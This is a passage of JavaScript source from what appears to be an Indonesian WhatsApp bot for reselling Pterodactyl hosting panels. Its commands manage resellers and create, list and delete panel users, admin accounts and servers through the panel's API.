Rafliereply(`Berhasil menambah owner ✅`)
}
break

case "listowner": case "listown": {
if (owners.length < 1) return Rafliereply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Raflie.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

case "address": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Rafliereply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return Rafliereply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
Rafliereply(`Berhasil menambah reseller ✅`)
}
break

case "listress": {
if (premium.length < 1) return Rafliereply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Raflie.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "delress": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Rafliereply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Rafliereply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return Rafliereply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
Rafliereply(`Berhasil menghapus reseller ✅`)
}
break

case "key": {
if (!isCreator) return Reply(mess.owner)
let teks = `
\`[ # ]\` Current Key: *${global.key}*

Silahkan Copy Key 🥶
`;
let msg = generateWAMessageFromContent(m.chat, {
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
footer: proto.Message.InteractiveMessage.Footer.create({
text: "[ # ] ʀᴀғʟɪᴇ ᴅᴇᴠ" }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{"display_text":"Salin Key","id":"copy_key","copy_code":"${global.key}"}` }]})})
}, { quoted: qtoko });
await Raflie.relayMessage(m.chat, msg.message, { messageId: msg.key.id })}
break;


case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "11gb": case "12gb": case "13gb": case "14gb": case "15gb": case "16gb": case "17gb": case "18gb": case "19gb": case "20gb": case "21gb": case "22gb": case "23gb": case "24gb": case "25gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return Rafliereply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else if (command == "11gb") {
ram = "11000"
disknya = "6000"
cpu = "240"
} else if (command == "12gb") {
ram = "12000"
disknya = "6000"
cpu = "260"
} else if (command == "13gb") {
ram = "13000"
disknya = "7000"
cpu = "280"
} else if (command == "14gb") {
ram = "14000"
disknya = "7000"
cpu = "300"
} else if (command == "15gb") {
ram = "15000"
disknya = "8000"
cpu = "320"
} else if (command == "16gb") {
ram = "16000"
disknya = "8000"
cpu = "340"
} else if (command == "17gb") {
ram = "17000"
disknya = "9000"
cpu = "360"
} else if (command == "18gb") {
ram = "18000"
disknya = "9000"
cpu = "380"
} else if (command == "19gb") {
ram = "19000"
disknya = "10000"
cpu = "400"
} else if (command == "20gb") {
ram = "20000"
disknya = "10000"
cpu = "420"
} else if (command == "21gb") {
ram = "21000"
disknya = "11000"
cpu = "440"
} else if (command == "22gb") {
ram = "22000"
disknya = "11000"
cpu = "460"
} else if (command == "23gb") {
ram = "23000"
disknya = "12000"
cpu = "480"
} else if (command == "24gb") {
ram = "24000"
disknya = "12000"
cpu = "500"
} else if (command == "25gb") {
ram = "25000"
disknya = "13000"
cpu = "520"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Rafliereply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Rafliereply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Rafliereply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await Raflie.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "cadp": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Rafliereply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Rafliereply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Rafliereply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Raflie.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break



case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Rafliereply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Raflie.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break



case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Rafliereply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Raflie.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break



case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Rafliereply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Raflie.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Rafliereply("Akun admin panel tidak ditemukan!")
await Rafliereply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break



case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Rafliereply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Raflie.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Rafliereply("Server panel tidak ditemukan!")
Rafliereply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "1gbv2": case "2gbv2": case "3gbv2": case "4gbv2": case "5gbv2": case "6gbv2": case "7gbv2": case "8gbv2": case "9gbv2": case "10gbv2": case "unlimitedv2": case "unliv2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return Rafliereply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gbv2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gbv2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gbv2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gbv2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gbv2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gbv2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gbv2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gbv2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gbv2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Rafliereply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Rafliereply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Rafliereply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await Raflie.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "cadpv2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Rafliereply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Rafliereply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Rafliereply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Raflie.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break



case "listadminv2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Rafliereply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Raflie.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladminv2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break



case "listpanelv2": case "listpv2": case "listserverv2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Rafliereply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Raflie.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanelv2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break



case "deladminv2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Rafliereply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladminv2 ${i.attributes.id}`
})
})
return Raflie.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Rafliereply("Akun admin panel tidak ditemukan!")
await Rafliereply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break



case "delpanelv2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Rafliereply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return Raflie.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© ʀᴀғʟɪᴇ ᴅᴇᴠ`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
